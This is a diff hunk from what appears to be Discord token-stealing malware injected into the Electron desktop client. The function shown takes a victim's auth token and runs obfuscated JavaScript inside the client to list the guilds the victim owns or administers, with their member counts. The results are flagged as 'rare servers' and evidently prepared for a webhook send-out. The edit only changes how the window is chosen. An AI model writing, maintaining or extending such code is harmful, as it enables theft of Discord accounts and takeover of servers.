@@ -723,7 +723,7 @@ async function sendToWebhook(params) {
 }
 
 async function getServers(token) {
-    const window = BrowserWindow.getAllWindows()[0];
+    const window = BrowserWindow.getFocusedWindow();
 
     const a = await window.webContents.executeJavaScript(`function GetCoolGuilds(e){var r=new XMLHttpRequest;return r.open("GET","https://discord.com/api/v9/users/@me/guilds",!1),r.setRequestHeader("Authorization",e),r.send(null),r.responseText}function GetServerList(e){var r,t=JSON.parse(e);for(var n in cc=t.filter((e=>1==e.owner)).concat(t.filter((e=>8==(8&e.permissions)))),cc)cc[n].membercount=(r=cc[n].id,window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(e,r,t)=>e.exports=t},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{gg=e}]),function(e){const r="string"==typeof e?e:null;for(const t in gg.c)if(gg.c.hasOwnProperty(t)){const n=gg.c[t].exports;if(n&&n.__esModule&&n.default&&(r?n.default[r]:e(n.default)))return n.default;if(n&&(r?n[r]:e(n)))return n}return null}("getMemberCount").getMemberCounts()[r]);return cc}function _696969(){var e=GetCoolGuilds("%TOKEN%"),r=GetServerList(e).filter((e=>e.membercount>=${config.minimum_members_per_server})),t="";for(const e of r)t+="Server Name: "+e.name+" - Owner: "+e.owner+" - Members: "+e.membercount+"\\n";return""==t&&(t="\`No rare servers :(\`"),JSON.stringify({message:t,totalguilds:r.length})}_696969();`.replace('%TOKEN%', token), true)
 
